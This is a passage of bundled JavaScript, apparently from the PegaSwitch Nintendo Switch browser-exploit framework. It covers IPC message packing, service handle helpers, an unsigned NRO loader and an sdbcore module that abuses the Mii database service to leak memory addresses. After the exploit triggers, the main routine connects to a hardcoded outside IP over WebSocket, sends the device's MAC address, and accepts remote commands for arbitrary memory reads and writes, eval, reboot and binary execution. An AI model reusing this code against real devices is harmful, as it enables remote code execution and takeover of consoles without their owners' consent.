	var rawDataOffset = 2 + descriptorSection.length; // 2 header bytes + descriptors
	while (((rawDataSection.length + rawDataOffset) & 3) !== 0) { rawDataSection.push(0); } // padding
	var paddingLength = rawDataSection.length;
	rawDataSection = rawDataSection.concat(alignedDataSection);
	for (var i = 0; i < 4-paddingLength; ++i) { rawDataSection.push(0); } // 0x10 bytes total padding
	rawDataSection = rawDataSection.concat(cDescriptorLengthsSection);

	var headerSection = [];
	headerSection.push(
		this.type | // Request
		(this.xDescriptors.length << 16) |
		(this.aDescriptors.length << 20) |
		(this.bDescriptors.length << 24) |
		(0 << 28) // W descriptors count
	);
	headerSection.push(
		(rawDataSection.length) |
		((this.cDescriptors.length !== 0 ? this.cDescriptors.length + 2 : 0) << 10) |
		(((this.pid || this.movedHandles.length > 0 || this.copiedHandles.length > 0) ? 1 : 0) << 31)
	);

	var buf = headerSection.concat(descriptorSection);
	buf = buf.concat(rawDataSection);
	buf = buf.concat(cDescriptorSection);
  
	for (var i = 0; i < buf.length; ++i) { buf[i] = buf[i] >>> 0; }

	return buf;
};

IPCMessage.prototype.sendTo = function (handleName) {
	var handle = handleName;
	if (!(handleName instanceof Array) && typeof(handleName) !== "number") {
		handle = this.sender.getAutoHandle(handleName);
	}

	if (this.packed === undefined) {
		this.packed = this.pack();
	}
	this.sc.ipcBuf.set(this.sc.emptyIpcBuf);
	this.sc.ipcBuf.set(this.packed);

	var self = this;

	if (this.sc !== this.sender) {
		this.sender.memcpyFromBrowser(this.sender.ipcBufAddr, this.sc.ipcBufAddr, 0x2000);
		this.copyBuffers.forEach((cr) => {
			self.sender.memcpyFromBrowser(cr.addr, cr.buf, cr.size);
		});
	}

	var ret = this.sender.svcSendSyncRequestWithUserBuffer(this.sender.ipcBufAddr, 0x2000, handle);

	if(!ret.isOk) {
		if (handle !== handleName) { // Remote port dead -- our handle is bad now
			this.sender.killAutoHandle(handleName);
		}
	}

	if (this.sc !== this.sender) {
		this.sender.memcpyToBrowser(this.sc.ipcBufAddr, this.sender.ipcBufAddr, 0x2000);
		this.copyBuffers.forEach((cr) => {
			self.sender.memcpyToBrowser(cr.buf, cr.addr, cr.size);
		});
	}

	if(ret.isOk) {
		return new IPCMessage(this.sc, this.sender).unpack(this.sc.ipcBuf, false);
	} else {
		return new IPCFailure(this.sc, this.sender, ret.getError());
	}
};

IPCMessage.prototype.asyncSendTo = function (handleName, timeout) {
	if (this.sc !== this.sender) {
		throw new Error('asyncSendTo is only supported on sploitcore');
	}

	var handle = handleName;
	if (!(handle instanceof Array) && typeof(handle) !== "number") {
		// using auto handles with this asynchronous stuff would be a recipe for disaster
		handle = this.sc.getService(handleName);
	}

	if (this.packed === undefined) {
		this.packed = this.pack();
	}

	var ipcBuf = new Uint32Array(0x2000 >> 2);
	ipcBuf.set(this.packed);

	var self = this;
  
	return this.sc.asyncCaller.call(this.sc.gadget([0x41, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6]), [this.sc.getArrayBufferAddr(ipcBuf), 0x2000, handle], timeout).then((ret) => {
		if (ret[0] === 0xf601 && handle !== handleName) {
			self.sc.svcCloseHandle(handle);
		}
		if (ret[0] !== 0) {
			return new IPCFailure(self.sc, self.sender, new ResultCode(ret));
		} else {
			return new IPCMessage(self.sc, self.sender).unpack(ipcBuf, false);
		}
	});
};

IPCMessage.prototype.unpack = function (buf, toDomain) {
	this.buffer = buf;
	if(toDomain === undefined) { toDomain = false; }
  
	this.dataBuffer = this.data = [];
	this.aDescriptors = [];
	this.bDescriptors = [];
	this.cDescriptors = [];
	this.xDescriptors = [];
	this.copiedHandles = [];
	this.movedHandles = [];

	var xCount = (buf[0] >>> 16) & 0xF;
	var aCount = (buf[0] >>> 20) & 0xF;
	var bCount = (buf[0] >>> 24) & 0xF;
	var wCount = (buf[0] >>> 28);

	if (wCount > 0) {
		throw new Error("can't unpack W descriptors yet");
	}

	var rawDataSectionLength = (buf[1] & 0x3FF) * 4;
	var alignedDataSectionLength = rawDataSectionLength - 0x10;
	var cDescriptors = ((buf[1] >>> 10) & 0x3) - 1;
	var hasHandleDescriptor = (buf[1] >>> 31) === 1;

	var pos = 2;

	if (hasHandleDescriptor) {
		var hd = buf[pos++];
		var hasPid = !!(hd & 1);
		var copyCount = (hd >>> 1) & 0xF;
		var moveCount = hd >>> 5;
		if (hasPid) { this.pid = [buf[pos++], buf[pos++]]; }
		for (var i = 0; i < copyCount; ++i) { this.copiedHandles.push(buf[pos++]); }
		for (var i = 0; i < moveCount; ++i) { this.movedHandles.push(buf[pos++]); }
	}

	for (var i = 0; i < xCount; ++i) {
		var a = buf[pos++];
		var b = buf[pos++];
		var addr = [b, (((a >>> 12) & 0xF) | ((a >>> 2) & 0x70)) >>> 0];
		var size = [a >>> 16, 0];
		var counter = (a & 0xE3F) >>> 0;
		this.xDescriptors.push([addr, size, counter]);
	}

	for (var i = 0; i < aCount + bCount; ++i) {
		var a = buf[pos++];
		var b = buf[pos++];
		var c = buf[pos++];
		var addr = [b, ((((c >>> 2) << 4) & 0x70) | ((c >>> 28) & 0xF)) >>> 0];
		var size = [a, ((c >>> 24) & 0xF) >>> 0];
		var perm = c & 3;
		if (i < aCount) { this.aDescriptors.push([addr, size, perm]); } else { this.bDescriptors.push([addr, size, perm]); }
	}

	var rawDataSectionOffset = pos;
	// padding
	if ((pos & 3) !== 0) { pos += 4 - (pos & 3); }

	var dataPayloadLength = alignedDataSectionLength;
	if (toDomain) {
		dataPayloadLength-= 0x10;
    
		this.objectDomainCommand = buf[pos] & 0xFF;

		if(this.objectDomainCommand === 2) {
			dataPayloadLength = 0;
		}
    
		var dataLength = buf[pos++] >> 16;
		if(dataLength != dataPayloadLength) {
			throw new Error('data payload length in domain header != expected data payload length');
		}
		this.objectId = buf[pos++];
		pos+= 2;
	}

	this.packed = Array.from(buf);
  
	if(dataPayloadLength > 0) {
		var dataPayloadBegin = pos;
    
		if ((buf[pos] & 0x00FFFFFF) !== 0x434653) {
			utils.hexdump("bad msg", buf, 0x50);
			throw new Error("SFCI/SFCO wasn't in expected position");
		}
    
		pos += 2;
		this.cmdId = this.resultCode = buf[pos];
		this.success = this.cmdId === 0;
		pos+= 2;
    
		while (pos < dataPayloadBegin + (dataPayloadLength >> 2)) {
			this.data.push(buf[pos++]);
		}
	}

	pos = rawDataSectionOffset + (rawDataSectionLength >> 2);
  
	for(var i = 0; i < cDescriptors; i++) {
		var a = buf[pos++];
		var b = buf[pos++];
		var addr = [a, (b & 0xFFFF) >>> 0];
		var size = [b >>> 16, 0];
		this.cDescriptors.push([addr, size]);
	}
  
	return this;
};

IPCMessage.prototype.show = function () {
	utils.log('IPC message:');
	if (this.resultCode !== 0) { utils.log('- Command ID / Result code: ' + new ResultCode(this.resultCode).toString()); }
	if (this.pid !== null) { utils.log('- PID: ' + utils.paddr(this.pid)); }
	if (this.dataBuffer.length > 0) {
		utils.log('- Data');
		utils.hexdump("    data", new Uint32Array(this.dataBuffer));
	}
	if (this.copiedHandles.length > 0) {
		utils.log('- Copied handles');
		for (var i = 0; i < this.copiedHandles.length; ++i) { utils.log('    - 0x' + this.copiedHandles[i].toString(16)); }
	}
	if (this.movedHandles.length > 0) {
		utils.log('- Moved handles');
		for (var i = 0; i < this.movedHandles.length; ++i) { utils.log('    - 0x' + this.movedHandles[i].toString(16)); }
	}
	if (this.aDescriptors.length > 0) { utils.log('- ' + this.aDescriptors.length + ' A descriptor' + (this.aDescriptors.length > 1 ? 's' : '')); }
	if (this.bDescriptors.length > 0) { utils.log('- ' + this.bDescriptors.length + ' B descriptor' + (this.bDescriptors.length > 1 ? 's' : '')); }
	if (this.cDescriptors.length > 0) { utils.log('- ' + this.cDescriptors.length + ' C descriptor' + (this.cDescriptors.length > 1 ? 's' : '')); }
	if (this.xDescriptors.length > 0) { utils.log('- ' + this.xDescriptors.length + ' X descriptor' + (this.xDescriptors.length > 1 ? 's' : '')); }

	return this;
};

IPCMessage.prototype.showPacked = function () {
	utils.hexdump("ipcm", this.pack());
	return this;
};

IPCMessage.prototype.toBuilderString = function () {
	function fmtU32Array(arr) {
		return arr.map((u32) => "0x" + u32.toString(16)).join(", ");
	}
  
	var str = "sc.ipcMsg(" + this.cmdId + ")";
	if(this.type !== 4) { str+= ".setType(" + this.type + ")"; }
	if(this.dataBuffer.length > 0) { str+= ".data(" + fmtU32Array(this.dataBuffer) + ")"; }
	this.aDescriptors.forEach((ad) => {
		str+= ".aDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.bDescriptors.forEach((ad) => {
		str+= ".bDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.cDescriptors.forEach((ad) => {
		str+= ".cDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.xDescriptors.forEach((ad) => {
		str+= ".xDescriptor(" + fmtU32Array(ad) + ")";
	});
	this.copiedHandles.forEach((ch) => {
		str+= ".copyHandle(0x" + ch.toString(16) + ")";
	});
	this.movedHandles.forEach((ch) => {
		str+= ".moveHandle(0x" + ch.toString(16) + ")";
	});
	if(this.objectDomainCommand) {
		switch(this.objectDomainCommand) {
		case 1:
			str+= ".toObject(" + this.objectId + ")";
			break;
		case 2:
			str+= ".closeObject(" + this.objectId + ")";
			break;
		default:
			throw new Error("unknown domain command");
		}
	}
	return str;
};

IPCMessage.prototype.assertOk = function () {
	if(!this.success) {
		this.show();
		throw new ResultCode(this.resultCode);
	} else {
		return this;
	}
};

IPCMessage.prototype.asResult = function () {
	if(this.success) {
		return new Result.Ok(this);
	} else {
		return new Result.Err(this);
	}
};

// calls cb if our result code == 0, err otherwise
// cb signature is (msg, moved, copied) => { ... }
// returns value returned from cb
IPCMessage.prototype.withHandles = function(cb, err) {
	try {
		if(this.success) {
			return cb(this, this.movedHandles, this.copiedHandles);
		} else {
			if(err) {
				return err(this, this.movedHandles, this.copiedHandles);
			} else {
				return this;
			}
		}
	} finally {
		var sender = this.sender;
		this.movedHandles.forEach((mh) => {
			sender.svcCloseHandle(mh);
		});
		this.copiedHandles.forEach((ch) => {
			sender.svcCloseHandle(ch);
		});
	}
};

IPCMessage.prototype.toString = function() {
	return "IPCMessage(" + this.cmdId + " = " + new ResultCode(this.resultCode).toString() + ")";
};

function IPCFailure(sc, sender, resultCode) {
	this.resultCode = resultCode;
	this.sc = sc;
	this.sender = sender;
}

IPCFailure.prototype.assertOk = function () {
	this.show();
	throw this.resultCode;
};

IPCFailure.prototype.asResult = function () {
	return new Result.Err(this);
};

IPCFailure.prototype.withHandles = function(ok, err) {
	if(err) {
		return err(this, [], []);
	} else {
		return this;
	}
};

IPCFailure.prototype.show = function () {
	utils.log("IPC Failure: " + this.resultCode.message + ", offending request shown below");
	new IPCMessage(this.sc, this.sender).unpack(this.sc.ipcBuf, false).show();
	return this;
};

IPCFailure.prototype.toString = function () {
	return "IPCFailure(" + this.resultCode.toString() + ")";
};

IPCFailure.prototype.success = false;
IPCFailure.prototype.isFailure = true;

sploitMixin.ipcMsg = function (cmdId) {
	return new IPCMessage(this.sc, this, cmdId);
};

/*
  If no `cb` is passed, return a Result.
    Ok(u32 handle) if everything is okay
    Err(ResultCode) if `sm:` returned an unsuccessful result code
    Throw if `name` is not a string, no such service exists, or we fail to connect to `sm:`
  If `cb` is passed:
    Calls `cb` with the `u32 handle` if successful. If we fail to get a handle, throw.
    Returns value returned from `cb` and automatically closes handle after `cb` returns.
 */
sploitMixin.getService = function (name, cb) {
	if (typeof(name) !== "string") {
		throw new Error("cannot get service with non-string name");
	}
	if (!this.sc.hasService(name)) {
		throw new Error('no such service');
	}

	if (this.smHandle === undefined) {
		this.smHandle = this.svcConnectToPort('sm:').assertOk();
	}
	var lol = utils.str2u64(name);
	var r = this.ipcMsg(1).datau64(lol).sendTo(this.smHandle).asResult().map((response) => response.movedHandles[0]);
	if(cb === undefined) {
		return r;
	} else {
		var h = r.assertOk();
		try {
			return cb(h);
		} finally {
			this.svcCloseHandle(h);
		}
	}
};

sploitMixin.getServices = function(services, callback) {
	var serviceHandles = [];

	for (var si = 0; si < services.length; si++) {
		var service = this.getService(services[si]).assertOk();
		serviceHandles.push( service );
	}

	try {
		return callback.apply(undefined, serviceHandles);
	} finally {
		for (var shi = 0; si < serviceHandles.length; shi++) {
			this.svcCloseHandle(serviceHandles[shi]);
		}
	}
};

sploitMixin.registerService = function (name, maxSessions) {
	if (this.smHandle === undefined) {
		this.smHandle = this.svcConnectToPort('sm:').assertOk();
	}
	if (maxSessions === undefined) {
		maxSessions = 1000;
	}
	var lol = utils.str2u64(name);
	utils.dlog('Registering service ' + name);
	return this.ipcMsg(2).datau64(lol, [maxSessions, 0x20]).sendTo(this.smHandle).asResult().map((r) => r.movedHandles[0]);
};

sploitMixin.unregisterService = function (name) {
	if (this.smHandle === undefined) {
		this.smHandle = this.svcConnectToPort('sm:').assertOk();
	}
	var lol = utils.str2u64(name);
	return this.ipcMsg(3).datau64(lol).sendTo(this.smHandle).asResult();
};

sploitcore.prototype.hasService = function (name) {
	if (this.ipcServices[name] === undefined) {
		var r = this.registerService(name, 1000);
		if(r.isOk) {
			this.ipcServices[name] = false;
			this.unregisterService(name).assertOk();
		} else {
			this.ipcServices[name] = true;
		}
	}
	return this.ipcServices[name];
};

sploitMixin.getAutoHandle = function (name) {
	if (this.ipcHandles[name] === undefined) {
		if (name instanceof Function) {
			this.ipcHandles[name] = name();
		} else if (typeof(name) === "string") {
			this.ipcHandles[name] = this.getService(name).assertOk();
		} else {
			throw new Error("invalid auto handle type " + name);
		}
	}
	return this.ipcHandles[name];
};

sploitMixin.killAutoHandle = function (name) {
	if (name === undefined) {
		for (var name in this.ipcHandles) {
			this.killAutoHandle(name);
		}
		return;
	}

	if (this.ipcHandles[name] === undefined) { return; }

	this.svcCloseHandle(this.ipcHandles[name]).assertOk();
	delete this.ipcHandles[name];
};

module.exports = IPCMessage;

},{"./Result":3,"./ResultCode":4,"./sploitMixin":12,"./sploitcore":13,"./svc":14,"./utils":15}],9:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
/* eslint no-eval: "off" */
/* global alert, WebSocket */
var reservedWords = require('reserved-words');

var SploitCore = require('./sploitcore');
window.IPCMessage = require('./ipc');
var utils = require('./utils');
var runNro = require('./runNro');
var config = require('../config');
var socket;

window.onerror = function (msg, url, line, col, error) {
	if (msg === 'Out of memory') { alert(msg); }

	var stack = error ? error.stack : null;

  document.getElementById("content").innerHTML += msg + "<br />";
	utils.send('error', [line, msg, stack]);
	if (socket) {
		socket.send(JSON.stringify({
			type: 'error',
			response: [ line, msg, stack ]
		}));
	}
	// location.reload();
};

utils.log('Loaded');

function handler (sc, socket) {
	return function (event) {
		var data = JSON.parse(event.data);

		if (data.cmd === 'sp') {
			utils.log('running getSP()...');
			socket.send(JSON.stringify({
				type: 'gotsp',
				response: utils.paddr(sc.getSP())
			}));
		} else if (data.cmd === 'gc') {
			utils.log('running GC');
			sc.gc();
			socket.send(JSON.stringify({
				type: 'gcran'
			}));
		} else if (data.cmd === 'malloc') {
			var size = parseInt(data.args[0]);
			var addr = sc.malloc(size);
			socket.send(JSON.stringify({
				type: 'mallocd',
				response: utils.paddr(addr)
			}));
		} else if (data.cmd === 'free') {
			var addr = utils.parseAddr(data.args[0]);
			sc.free(addr);
		} else if (data.cmd === 'write4' || data.cmd === 'write8') {
			utils.log(JSON.stringify(data));
			var addr = utils.parseAddr(data.args[0]);
			var value = parseInt(data.args[1]);
			var offset = parseInt(data.args[2]) || 0;

			sc[data.cmd](value, addr, offset);
		} else if (data.cmd === 'read4' || data.cmd === 'read8') {
			var addr = utils.parseAddr(data.args[0]);
			var offset = parseInt(data.args[1]) || 0;

			var response = sc[data.cmd](addr, offset);

			socket.send(JSON.stringify({
				type: 'rread',
				response: response
			}));
		} else if (data.cmd === 'readstring') {
			var addr = utils.parseAddr(data.args[0]);
			var length = parseInt(data.args[1]) || 0;

			socket.send(JSON.stringify({
				type: 'rreadstring',
				response: sc.readString(addr, length)
			}));
		} else if (data.cmd === 'eval') {
			var words = Object.keys(reservedWords.KEYWORDS['6-strict']);
			var code = data.args.join(' ');
			var ret = true;
			if (~code.indexOf('window.response')) {
				ret = false;
			}
			for (var i = 0; i < words.length; i++) {
				var w = words[i];
				var s = code.substr(0, w.length);
				if (s === w) {
					ret = false;
				}
			}
			if (ret) {
				code = 'window.response = ' + code;
			}
			window.response = null;
			eval('with (sc) { ' + code + '}');
			socket.send(JSON.stringify({
				type: 'evald',
				response: window.response || 'no output'
			}));
		} else if (data.cmd === 'evalfile') {
			var code = data.args[0];
			eval('with (sc) {\n' + code + '\n}');
			socket.send(JSON.stringify({
				type: 'evald',
				response: 'no output'
			}));
		} else if (data.cmd === 'reboot') {
			socket.send(JSON.stringify({
				type: 'rebooting',
				response: 'Rebooting...'
			}));
			sc.ipcMsg(1).sendTo("bpc").assertOk();
		} else if (data.cmd === 'runnro') {
			runNro(data.args[0], data.args.slice(1));
			socket.send(JSON.stringify({
				type: 'rannro',
				response: 'no output'
			}));
		}
	};
}

function setupListener (sc) {
	socket = new WebSocket('ws://91.121.81.160:8100');

	var handlerFcn = handler(sc, socket);
	socket.onmessage = (evt) => {
		try {
			handlerFcn(evt);
		} catch (e) {
			window.onerror(e.message, null, e.line, null, e);
		}
	};

	socket.onopen = function () {
		sc.getService("set:cal", (setcal) => {
			socket.send(JSON.stringify({
				type: "identification",
				mac: sc.ipcMsg(6).sendTo(setcal).assertOk().data,
				version: sc.version
			}));
		});
		utils.log("Connected to PC...");
	};

	socket.onerror = function() {
		utils.log("socket error, attempting to reconnect in 5 seconds...");
		window.setTimeout(() => {
			socket.close();
			setupListener(sc);
		}, 5000);
	};
	
	socket.onclose = function() {
		utils.log("socket closed, attempting to reconnect in 5 seconds...");
		window.setTimeout(() => {
			utils.log("attempting to reconnect...");
			setupListener(sc);
		}, 5000);
	};
}

function main () {
	if (window.exploitMe === null) {
		utils.log('Exploit failed.');
		if (window.errmsg === null) { utils.log('Unknown reason.'); } else { utils.log(window.errmsg); }
		utils.log('~~failed');
		window.location.reload();
		return;
	}

	utils.log('Exploit triggered. Beginning breakage.');
	var sc = window.sc = new SploitCore(window.exploitMe); // Keep SC in window just so the GC never even tries to wipe us out. Just for sanity.

	// SDBCore is up
	if (sc.sdb != null && config.autorun) {
		sc.sdb.onready = function() {
			// AutoNRO
			utils.log("Running auto.nro");
			var xhr = new XMLHttpRequest();
			xhr.open('GET', '/nros/auto.nro', false);
			xhr.send(null);

			if (xhr.status === 200) {
				var nro = new Uint8Array(JSON.parse(xhr.response)).buffer;
				console.log(nro.length);
				runNro(nro);
			}
		};
	}

	utils.log('Pegaswitch loaded!');
	utils.log('UA: ' + navigator.userAgent);

	setupListener(sc);
}

try {
	main();
} catch (e) {
	window.onerror(e.message, null, e.line, null, e);
}

},{"../config":1,"./ipc":8,"./runNro":10,"./sploitcore":13,"./utils":15,"reserved-words":18}],10:[function(require,module,exports){
/*
	requires spl MITM and ro!ease_nro_restriction = 0x1
*/

var utils = require("./utils")

module.exports = (res, args) => {
	if(!sc.sdb) {
		throw new Error("requires spl mitm. try `enable sdbcore`");
	}
	if(sc.version !== "3.0.0") {
		throw new Error("requires 3.0.0");
	}
	
	var nrr = new ArrayBuffer(0x1000);
	var nrru32 = new Uint32Array(nrr);
	nrru32[0] = 0x3052524E; // NRR0
	nrru32[(0x338 >> 2) + 0] = 0x1000; // Size
	nrru32[(0x340 >> 2) + 0] = 0x350; // Hash offset
	nrru32[(0x340 >> 2) + 1] = 0x1; // Hash count
	
	while(res.length & 0xFFF)
		res.push(0);
	var u8 = new Uint8Array(res);
	var u32 = new Uint32Array(u8.buffer);

	var nroSize = u32[0x18 >> 2];
	var bssSize = u32[0x38 >> 2];
	var mod0Offset = u32[1];
	var dynamicOffset = mod0Offset + u32[(mod0Offset >> 2) + 1];

	utils.log("dynamic offset: 0x" + dynamicOffset.toString(16));

	crypto.subtle.digest("SHA-256", u8.buffer).then((hash) => {
		var nrrhashu8 = new Uint8Array(nrr, 0x350, 32);
		var hashu8 = new Uint8Array(hash);
		nrrhashu8.set(hashu8);
		
		sc.getService("ldr:ro", (ldrro) => {
			var nrraddr = sc.getArrayBufferAddr(nrr);
			sc.ipcMsg(4).datau64(0).sendPid().copyHandle(0xffff8001).sendTo(ldrro).assertOk();
			sc.ipcMsg(2).datau64(0, nrraddr, nrr.byteLength).sendPid().sendTo(ldrro).show();
			
			var nrobase = sc.malloc(u8.length + bssSize + 0xfff);
			if(nrobase[0] & 0xFFF)
				nrobase[0] = ((nrobase[0] & 0xFFFFF000) + 0x1000) >>> 0;
			
			sc.memcpy(nrobase, u8, u8.byteLength);
			
			sc.svcNroBase = sc.ipcMsg(0).datau64(0, nrobase, nroSize, utils.add2(nrobase, nroSize), bssSize).sendPid().sendTo(ldrro).assertOk().data;

			sc.ipcMsg(3).datau64(0, nrraddr).sendPid().sendTo(ldrro).assertOk();
			
			utils.log('NRO loaded at ' + utils.paddr(sc.svcNroBase));

			if(args === undefined) {
				args = [];
			}
			var argAbs = args.map((arg) => utils.str2ab(arg));
			var argv = new Uint32Array(argAbs.length * 2);
			for(var i = 0; i < argAbs.length; i++) {
				var addr = sc.getArrayBufferAddr(argAbs[i]);
				argv[(i*2)+0] = addr[0];
				argv[(i*2)+1] = addr[1];
			}
			utils.hexdump("argv", argv);

			var argvAddr = sc.getArrayBufferAddr(argv);

			var magic = utils.parseAddr("007874635f656361");
			var appHeap = new ArrayBuffer(0x400000);
			var appHeapAddr = sc.getArrayBufferAddr(appHeap);
			
			var libtransistorContext = new Uint32Array([
				magic[0], magic[1],
				3, 0, // version
				0, 0, // size (written in later)

				0, 0, // OUT char *log_buffer
				0, 0, // OUT size_t *log_size

				argvAddr[0], argvAddr[1], // IN char **argv
				argAbs.length, 0, // IN uint64_t argc

				appHeapAddr[0], appHeapAddr[1], // IN void* mem_base
				appHeap.byteLength, 0, // IN uint64_t mem_size

				0, // IN bool has_bsd
				0, // padding
				0, 0, 0, 0, // IN ipc_object_t bsd_object
				0, // IN int std_socket

				0, // IN bool has_ro
				0, 0, 0, 0, // IN ipc_object_t ro_object

				0, // workstation_addr
				0, // padding
				
				0, 0, // OUT return_flags

				0, // IN thread_h main_thread
				0, // padding
			]);
			libtransistorContext[4] = libtransistorContext.byteLength;
			
			utils.log("closing sm and jumping...");
			sc.svcCloseHandle(sc.smHandle).assertOk();
			sc.smHandle = undefined;
			utils.log("returned " + utils.paddr(sc.call(utils.add2(sc.svcNroBase, 0x80), [libtransistorContext])));
			
			var logBufferAddr = [libtransistorContext[6], libtransistorContext[7]];
			var logLengthAddr = [libtransistorContext[8], libtransistorContext[9]];
			utils.log("log buffer: " + utils.paddr(logBufferAddr));
			
			utils.log("LOG:");
			sc.memview(logBufferAddr, sc.read4(logLengthAddr), (logab) => {
				utils.log(utils.u8a2nullstr(new Uint8Array(logab)));
			});

			var flagsLo = libtransistorContext[32];
			if((flagsLo & 4) > 0) { // RETF_CLOSE_BROWSER
				window.close();
			}
		});
	}).catch((e) => {
		utils.log("error in then()");
		window.onerror(e.message, null, e.line, null, e);
	});
};

},{"./utils":15}],11:[function(require,module,exports){
var utils = require('./utils');
var svcMixin = require('./svc');
var sploitMixin = require('./sploitMixin');

function c32to8(data)
{
	var len = data.length;
	var ret = new Uint8Array(len * 4);
	var offs = 0;

	for(i = 0; i < len; i++)
	{
		ret[offs++] = data[i] & 0xFF;
		ret[offs++] = (data[i] >>> 8) & 0xFF;
		ret[offs++] = (data[i] >>> 16) & 0xFF;
		ret[offs++] = data[i] >>> 24;
	}

	return ret;
}

function c64to8(data)
{
	var len = data.length;
	var ret = new Uint8Array(len * 8);
	var offs = 0;

	for(i = 0; i < len; i++)
	{
		ret[offs++] = data[i][0] & 0xFF;
		ret[offs++] = (data[i][0] >>> 8) & 0xFF;
		ret[offs++] = (data[i][0] >>> 16) & 0xFF;
		ret[offs++] = (data[i][0] >>> 24) & 0xFF;
		ret[offs++] = data[i][1] & 0xFF;
		ret[offs++] = (data[i][1] >>> 8) & 0xFF;
		ret[offs++] = (data[i][1] >>> 16) & 0xFF;
		ret[offs++] = (data[i][1] >>> 24) & 0xFF;
	}

	return ret;
}

function c8to32(data)
{
	var len = data.length / 4;
	var ret = new Uint32Array(len);
	var offs = 0;

	for(i = 0; i < len; i++)
	{
		ret[i] = data[offs++];
		ret[i] |= data[offs++] << 8;
		ret[i] |= data[offs++] << 16;
		ret[i] |= data[offs++] << 24;
	}

	return ret;
}

function _crc(data, len)
{
	var crc = 0;

	for(j = 0; j < len; j++)
	{
		var v = 0x80;
		for(i = 0; i < 8; i++)
		{
			var xorf = crc & 0x8000;
			crc = (crc << 1) & 0xFFFF

			if(data[j] & v)
				crc = (crc + 1) & 0xFFFF;
			if(xorf)
				crc ^= 0x1021;
			v >>= 1;
		}
	}
	return crc;
}

function writePdm(payload)
{
//	var data = payload.buffer;
//	utils.hexdump("dat", data);
	sc.ipcMsg(4).sendTo('pdm:ntfy').assertOk();
//	sc.ipcMsg(5).aDescriptor(data, data.byteLength, 0).sendTo('pdm:ntfy').assertOk();
	sc.ipcMsg(5).aDescriptor(payload, payload.length, 0).sendTo('pdm:ntfy').assertOk();
}

function getMiiAuthorId()
{
	return c32to8(sc.ipcMsg(90).sendTo('set:sys').assertOk().data);
}

function crcMiiBuf(b, authorid)
{
	var ret = new Uint8Array(b.length + 4);
	ret.set(b);

	var crc1 = _crc(ret, b.length + 2);
	ret[b.length] = crc1 >> 8;
	ret[b.length+1] = crc1 & 0xFF;

	var temp = new Uint8Array(authorid.length + ret.length);
	temp.set(authorid);
	temp.set(ret, authorid.length);

	var crc2 = _crc(temp, temp.length);
	ret[b.length+2] = crc2 >> 8;
	ret[b.length+3] = crc2 & 0xFF;

	return ret;
}

function AddOrReplace(hnd, key, unm, authorid)
{
	var crcbuf = new Uint8Array(unm.length + key.length);
	crcbuf.set(unm);
	crcbuf.set(key, unm.length);
	crcbuf = crcMiiBuf(crcbuf, authorid);

	var new_mii = new Uint8Array(crcbuf.length + 4);
	new_mii.set(crcbuf);

	var new_mii_as_words = c8to32(new_mii);

	var ipc = sc.ipcMsg(13);
	ipc.datau32.apply(ipc, new_mii_as_words);
	ipc.sendTo(hnd).assertOk();
}

function Move(hnd, key, pos)
{
	var data = new Uint32Array(key.length / 4 + 1);
	data.set(c8to32(key));
	data[data.length - 1] = pos;
	var ipc = sc.ipcMsg(12);
	ipc.datau32.apply(ipc, data);
	ipc.sendTo(hnd).assertOk();
}

function Delete(hnd, key)
{
	var data = c8to32(key);
	var ipc = sc.ipcMsg(14);
	ipc.datau32.apply(ipc, data);
	ipc.sendTo(hnd).assertOk();
}

function GetCount(hnd)
{
	ret = sc.ipcMsg(2).datau32(1).sendTo(hnd).assertOk().data[0];
//	utils.log("mii count is " + ret.toString());
	return ret;
}

function GetDefault(hnd, offset)
{
	ret = sc.ipcMsg(7).datau32(offset).sendTo(hnd).assertOk();
	return ret.data;
}

function GetLoadBase(hnd, authorid)
{
	var unm = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x97, 0x02, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
	var key = c64to8([[0xcafe, 0], [0xcafe0080, 0]]);

	AddOrReplace(hnd, key, unm, authorid);

	var data = GetDefault(hnd, (0x010b4b20 + 0xC + 0x44 * (GetCount(hnd) - 1) - 0x01079438) / 4);

	Delete(hnd, key);

	return utils.add2([data[5], data[6]], -0x9c540);
}

function Wipe(hnd)
{
	var buf = new Uint8Array(100*0x44);
	var count = sc.ipcMsg(9).data(1).bDescriptor(buf, buf.length, 0).sendTo(hnd).assertOk().data[0];

	if(!count)
		return;

	utils.log("mii count to delete " + count.toString());

	var key = new Uint8Array(16);

	for(mii = 0; mii < count; mii++)
	{
		for(j = 0; j < 16; j++)
			key[j] = buf[j + 48 + mii * 0x44];
		Delete(hnd, key);
	}
}


function getServicePid(service)
{
	var res = sc.ipcMsg(2).setType(3).datau64(0).sendTo(service).assertOk();
	sc.svcCloseHandle(res.movedHandles[0]);
	return res.pid[0];
}

function checkMiiCode(code)
{
	var checker = [0,1,2,3,4,5,6,7,8,16,17,18,19,20,21,22,23,24,32,33,34,35,36,37,38,39,40,48,49,50,51,52,53,54,55,56,64,65,66,67,68,69,70,71,72,80,81,82,83,84,85,86,87,88,96,97,98,99,100,101,102,103,104,112,113,114,115,116,117,118,119,120,128,129,130,131,132,133,134,135,136];
	return checker.indexOf(code) >= 0;
}

var sdbcore = function(sc, vers) {
	if (!sdbcore.prototype.importedMixins) {
		Object.keys(svcMixin).forEach((k) => {
			sdbcore.prototype[k] = svcMixin[k];
		});

		Object.keys(sploitMixin).forEach((k) => {
			sdbcore.prototype[k] = sploitMixin[k];
		});

		sdbcore.prototype.importedMixins = true;
	}

	utils.log('Starting sdbcore...');
	this.sc = sc;
	window.sc = sc;
	this.initialized = false;
	this.vers = vers;
	this.offsets = this.get_offsets();
	if (this.offsets == null) {
		utils.log('Unknown version: '+vers);
		return;
	}
	this.svcs = this.offsets['svc_dic'];

	this.sploitMixinInit();

	utils.log('Pwning sdb...');
	this.initialize(this.sc);
	utils.log('Pwned sdb...');
};

sdbcore.prototype.name = "sdb";

sdbcore.prototype.queryMem = function(addr, raw) {
	if(arguments.length == 1)
		raw = false;

	var meminfo = utils.add2(this.ropBase, 0x40000);
	var pageinfo = utils.add2(this.ropBase, 0x40028);

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
